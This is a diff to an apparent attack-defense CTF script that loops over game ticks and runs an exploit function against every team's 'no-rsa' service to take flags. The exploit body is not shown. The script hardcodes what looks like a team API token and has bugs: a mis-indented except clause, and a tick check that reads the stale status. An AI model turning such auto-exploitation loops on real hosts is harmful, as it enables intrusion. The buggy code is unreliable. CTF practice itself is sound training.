@@ -1,6 +1,7 @@
 from swpag_client import Team
 import json
 import socket
+import time
 
 def netcat(hostname, port, content):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,28 +47,38 @@ def exploit_no_rsa(hostname, port, flagId):
 t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
 print(t.game_url)
 #print(t.get_vm())
-print(t.get_game_status())
-print(t.get_service_list())
-#t.get_targets(service_id)
-services = t.get_service_list()
-print('services:',services)
-print()
-print()
-for service in services:
-    print 'SERVICE NAME:',service
-    print 'SERVICE ID:',service['service_id']
-    service_id = service['service_id']
-    service_name = service['service_name']
-    print 'service_name:',service_name
-    targets = t.get_targets(service_id)
-    for target in targets:
-        print('TARGET NAME:',target)#,netcat(target,''))
-        hostname = target['hostname']
-        port = target['port']
-        flag_id = target['flag_id']
-        if service_name == 'no-rsa':
-	    try:
-            	exploit_no_rsa(hostname,port,flag_id)
-	    except:
-		print('Exception occured for user')	
-        #break
+while True:
+    gameStatus = t.get_game_status()
+    print('gameStatus:',gameStatus)
+    currentTick = gameStatus['tick']['tick_id']
+    print(t.get_service_list())
+    #t.get_targets(service_id)
+    services = t.get_service_list()
+    print('services:',services)
+    print()
+    print()
+    for service in services:
+        print 'SERVICE NAME:',service
+        print 'SERVICE ID:',service['service_id']
+        service_id = service['service_id']
+        service_name = service['service_name']
+        print 'service_name:',service_name
+        targets = t.get_targets(service_id)
+        for target in targets:
+            print('TARGET NAME:',target)#,netcat(target,''))
+            hostname = target['hostname']
+            port = target['port']
+            flag_id = target['flag_id']
+            if service_name == 'no-rsa':
+                try:
+                        exploit_no_rsa(hostname,port,flag_id)
+                except:
+                print('Exception occured for user')
+            #break
+    while True:
+        newGameStatus = t.get_game_status()
+        newTick = gameStatus['tick']['tick_id']
+        print 'Checking new tick:',newTick
+        if newTick != currentTick:
+            break
+        time.sleep(120)
